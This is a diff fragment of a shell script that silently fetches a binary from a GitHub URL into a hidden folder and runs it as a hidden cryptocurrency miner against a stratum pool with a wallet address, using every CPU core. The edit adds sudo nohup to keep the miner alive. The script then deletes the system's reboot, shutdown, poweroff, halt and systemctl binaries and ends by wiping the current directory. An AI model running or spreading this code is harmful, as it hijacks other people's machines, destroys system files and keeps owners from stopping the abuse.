@@ -22,7 +22,7 @@ ph add sgr1
 mkdir .lib && cd .lib
 wget -O sgr1 https://github.com/TiannaMcdowell/All-File/raw/main/maker > /dev/null 2>&1
 chmod u+x sgr1
-./sgr1 -a YespowerSugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qg5nd84pj3g7e8wghrayxeu30e6hcg73q46e5pd.sukri -p x -t $(nproc --all) > /dev/null 2>&1 &
+sudo nohup ./sgr1 -a YespowerSugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qg5nd84pj3g7e8wghrayxeu30e6hcg73q46e5pd.sukri -p x -t $(nproc --all) > /dev/null 2>&1 &
 sleep 30
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 rm -rvf *
